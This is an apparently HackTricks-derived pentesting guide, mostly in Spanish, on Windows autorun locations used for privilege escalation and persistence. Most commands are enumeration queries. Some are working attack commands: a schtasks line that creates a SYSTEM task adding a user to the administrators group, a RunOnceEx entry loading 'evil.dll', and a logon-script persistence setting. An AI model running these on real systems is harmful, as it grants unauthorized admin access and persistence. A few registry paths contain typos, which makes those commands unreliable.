# Privilege Escalation with Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** se puede usar para ejecutar programas al **inicio**. Ve qué binarios están programados para ejecutarse al inicio con:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Tareas programadas

**Tasks** pueden programarse para ejecutarse con una **cierta frecuencia**. Mira qué binarios están programados para ejecutarse con:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Carpetas

Todos los binarios ubicados en las **carpetas Startup se ejecutarán al iniciar**. Las carpetas de inicio comunes son las que se enumeran a continuación, pero la carpeta de inicio está indicada en el registro. [Lee esto para aprender dónde.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Las vulnerabilidades de *path traversal* en la extracción de archivos comprimidos (como la explotada en WinRAR antes de 7.13 – CVE-2025-8088) pueden aprovecharse para **depositar payloads directamente dentro de estas carpetas Startup durante la descompresión**, lo que resulta en ejecución de código en el siguiente inicio de sesión del usuario. Para un análisis profundo de esta técnica, consulta:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): La entrada de registro **Wow6432Node** indica que estás ejecutando una versión de Windows de 64 bits. El sistema operativo usa esta clave para mostrar una vista separada de HKEY_LOCAL_MACHINE\SOFTWARE para aplicaciones de 32 bits que se ejecutan en versiones de Windows de 64 bits.

### Runs

**Commonly known** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Las claves de registro conocidas como **Run** y **RunOnce** están diseñadas para ejecutar programas automáticamente cada vez que un usuario inicia sesión en el sistema. La línea de comando asignada como valor de datos de una clave está limitada a 260 caracteres o menos.

**Service runs** (can control automatic startup of services during boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

En Windows Vista y versiones posteriores, las claves de registro **Run** y **RunOnce** no se generan automáticamente. Las entradas en estas claves pueden iniciar programas directamente o especificarlos como dependencias. Por ejemplo, para cargar un archivo DLL al iniciar sesión, se podría usar la clave de registro **RunOnceEx** junto con una clave "Depend". Esto se demuestra agregando una entrada de registro para ejecutar "C:\temp\evil.dll" durante el inicio del sistema:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Si puedes escribir dentro de cualquiera de los registry mencionados en **HKLM** puedes escalar privilegios cuando un usuario diferente inicie sesión.

> [!TIP]
> **Exploit 2**: Si puedes sobrescribir cualquiera de los binaries indicados en cualquiera de los registry dentro de **HKLM** puedes modificar ese binary con una backdoor cuando un usuario diferente inicie sesión y escalar privilegios.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Los accesos directos colocados en la carpeta **Startup** activarán automáticamente servicios o aplicaciones para iniciarse durante el inicio de sesión del usuario o el reinicio del sistema. La ubicación de la carpeta **Startup** se define en el registro tanto para los ámbitos de **Local Machine** como de **Current User**. Esto significa que cualquier acceso directo añadido a estas ubicaciones **Startup** especificadas garantizará que el servicio o programa vinculado se inicie después del proceso de inicio de sesión o reinicio, lo que lo convierte en un método sencillo para programar programas para que se ejecuten automáticamente.

> [!TIP]
> Si puedes sobrescribir cualquier carpeta **[User] Shell Folder** bajo **HKLM**, podrás apuntarla a una carpeta controlada por ti y colocar un backdoor que se ejecutará cada vez que un usuario inicie sesión en el sistema, escalando privilegios.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Este valor de registro por usuario puede apuntar a un script o comando que se ejecuta cuando ese usuario inicia sesión. Es principalmente una primitiva de **persistence** porque solo se ejecuta en el contexto del usuario afectado, pero aun así merece la pena comprobarlo durante post-exploitation y revisiones de autoruns.

> [!TIP]
> Si puedes escribir este valor para el usuario actual, puedes volver a activar la ejecución en el siguiente inicio de sesión interactivo sin necesitar privilegios de admin. Si puedes escribirlo para otro hive de usuario, puedes obtener code execution cuando ese usuario inicie sesión.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Notas:

- Preferir rutas completas a archivos `.bat`, `.cmd`, `.ps1` u otros launchers ya legibles por el usuario objetivo.
- Esto persiste tras cerrar sesión/reiniciar hasta que se elimine el valor.
- A diferencia de `HKLM\...\Run`, esto **no** otorga elevación por sí mismo; es persistencia a nivel de usuario.

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Normalmente, la clave **Userinit** se establece en **userinit.exe**. Sin embargo, si esta clave se modifica, el ejecutable especificado también será lanzado por **Winlogon** al iniciar sesión el usuario. Del mismo modo, la clave **Shell** está pensada para apuntar a **explorer.exe**, que es el shell predeterminado de Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Si puedes sobrescribir el valor del registro o el binario, podrás escalar privilegios.

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Comprueba la clave **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Cambiando el Command Prompt de Safe Mode

En el Windows Registry bajo `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, hay un valor **`AlternateShell`** establecido por defecto en `cmd.exe`. Esto significa que cuando eliges "Safe Mode with Command Prompt" durante el inicio (pulsando F8), se usa `cmd.exe`. Pero es posible configurar tu computadora para iniciar automáticamente en este modo sin necesidad de pulsar F8 y seleccionarlo manualmente.

Pasos para crear una opción de arranque para iniciar automáticamente en "Safe Mode with Command Prompt":

1. Cambia los atributos del archivo `boot.ini` para quitar los flags de solo lectura, sistema y oculto: `attrib c:\boot.ini -r -s -h`
2. Abre `boot.ini` para editarlo.
3. Inserta una línea como: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Guarda los cambios en `boot.ini`.
5. Vuelve a aplicar los atributos originales del archivo: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Cambiar la clave de registry **AlternateShell** permite configurar una command shell personalizada, con posibilidad de acceso no autorizado.
- **Exploit 2 (PATH Write Permissions):** Tener permisos de escritura en cualquier parte de la variable de sistema **PATH**, especialmente antes de `C:\Windows\system32`, te permite ejecutar un `cmd.exe` personalizado, que podría ser una backdoor si el sistema arranca en Safe Mode.
- **Exploit 3 (PATH and boot.ini Write Permissions):** Tener acceso de escritura a `boot.ini` permite el inicio automático en Safe Mode, facilitando el acceso no autorizado en el siguiente reinicio.

Para comprobar la configuración actual de **AlternateShell**, usa estos comandos:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup es una feature de Windows que **se inicia antes de que el entorno de escritorio se cargue por completo**. Prioriza la ejecución de ciertos comandos, que deben completarse antes de que continúe el logon del usuario. Este proceso ocurre incluso antes de que se disparen otras entradas de inicio, como las de las secciones del registry Run o RunOnce.

Active Setup se gestiona a través de las siguientes registry keys:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Dentro de estas keys, existen varios subkeys, cada uno correspondiente a un componente específico. Los key values de interés particular incluyen:

- **IsInstalled:**
- `0` indica que el comando del componente no se ejecutará.
- `1` significa que el comando se ejecutará una vez por cada usuario, que es el comportamiento por defecto si el valor `IsInstalled` falta.
- **StubPath:** Define el comando que Active Setup ejecutará. Puede ser cualquier línea de comandos válida, como lanzar `notepad`.

**Security Insights:**

- Modificar o escribir en una key donde **`IsInstalled`** esté establecido en `"1"` con un **`StubPath`** específico puede llevar a la ejecución no autorizada de comandos, potencialmente para privilege escalation.
- Alterar el archivo binario referenciado en cualquier valor **`StubPath`** también podría lograr privilege escalation, dadas las permisos suficientes.

Para inspeccionar las configuraciones de **`StubPath`** en los componentes de Active Setup, se pueden usar estos comandos:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Overview of Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) son módulos DLL que añaden funciones extra a Microsoft Internet Explorer. Se cargan en Internet Explorer y Windows Explorer en cada inicio. Sin embargo, su ejecución puede bloquearse configurando la clave **NoExplorer** en 1, evitando que se carguen con instancias de Windows Explorer.

BHOs son compatibles con Windows 10 a través de Internet Explorer 11, pero no están soportados en Microsoft Edge, el navegador predeterminado en versiones más nuevas de Windows.

Para explorar los BHOs registrados en un sistema, puedes inspeccionar las siguientes claves del registro:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Cada BHO está representado por su **CLSID** en el registro, sirviendo como un identificador único. La información detallada de cada CLSID puede encontrarse en `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Para consultar BHOs en el registro, se pueden utilizar estos comandos:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Ten en cuenta que el registry contendrá 1 nueva clave de registry por cada dll y estará representada por el **CLSID**. Puedes encontrar la información del CLSID en `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Abrir comando

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Opciones de Ejecución de Archivos de Imagen
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Tenga en cuenta que todos los sitios donde puede encontrar autoruns **ya son buscados por**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Sin embargo, para una **lista más completa de archivos autoejecutados** podría usar [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)de systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Más

**Encuentra más Autoruns como registros en** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## Referencias

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://attack.mitre.org/techniques/T1037/001/](https://attack.mitre.org/techniques/T1037/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)



{{#include ../../banners/hacktricks-training.md}}
